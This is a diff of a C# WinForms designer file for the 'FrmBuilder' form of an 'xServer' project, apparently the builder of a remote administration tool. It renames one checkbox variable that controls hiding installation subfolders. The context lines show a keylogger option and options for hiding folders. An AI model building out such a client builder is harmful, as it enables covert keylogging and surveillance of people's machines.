@@ -124,7 +124,7 @@
             this.line10 = new xServer.Controls.Line();
             this.label14 = new System.Windows.Forms.Label();
             this.chkKeylogger = new System.Windows.Forms.CheckBox();
-            this.chkHideSubdirectory = new System.Windows.Forms.CheckBox();
+            this.chkHideSubDirectory = new System.Windows.Forms.CheckBox();
             this.contextMenuStrip.SuspendLayout();
             this.builderTabs.SuspendLayout();
             this.generalPage.SuspendLayout();
@@ -541,7 +541,7 @@
             // installationPage
             // 
             this.installationPage.BackColor = System.Drawing.SystemColors.Control;
-            this.installationPage.Controls.Add(this.chkHideSubdirectory);
+            this.installationPage.Controls.Add(this.chkHideSubDirectory);
             this.installationPage.Controls.Add(this.line7);
             this.installationPage.Controls.Add(this.label10);
             this.installationPage.Controls.Add(this.line4);
@@ -1119,13 +1119,13 @@
             // 
             // chkHideSubdirectory
             // 
-            this.chkHideSubdirectory.AutoSize = true;
-            this.chkHideSubdirectory.Location = new System.Drawing.Point(186, 185);
-            this.chkHideSubdirectory.Name = "chkHideSubdirectory";
-            this.chkHideSubdirectory.Size = new System.Drawing.Size(202, 17);
-            this.chkHideSubdirectory.TabIndex = 37;
-            this.chkHideSubdirectory.Text = "Set subfolder attributes to hidden";
-            this.chkHideSubdirectory.UseVisualStyleBackColor = true;
+            this.chkHideSubDirectory.AutoSize = true;
+            this.chkHideSubDirectory.Location = new System.Drawing.Point(186, 185);
+            this.chkHideSubDirectory.Name = "chkHideSubdirectory";
+            this.chkHideSubDirectory.Size = new System.Drawing.Size(202, 17);
+            this.chkHideSubDirectory.TabIndex = 37;
+            this.chkHideSubDirectory.Text = "Set subfolder attributes to hidden";
+            this.chkHideSubDirectory.UseVisualStyleBackColor = true;
             // 
             // FrmBuilder
             // 
@@ -1262,6 +1262,6 @@
         private System.Windows.Forms.CheckBox chkHideLogDirectory;
         private System.Windows.Forms.NumericUpDown numericUpDownDelay;
         private System.Windows.Forms.NumericUpDown numericUpDownPort;
-        private System.Windows.Forms.CheckBox chkHideSubdirectory;
+        private System.Windows.Forms.CheckBox chkHideSubDirectory;
     }
 }
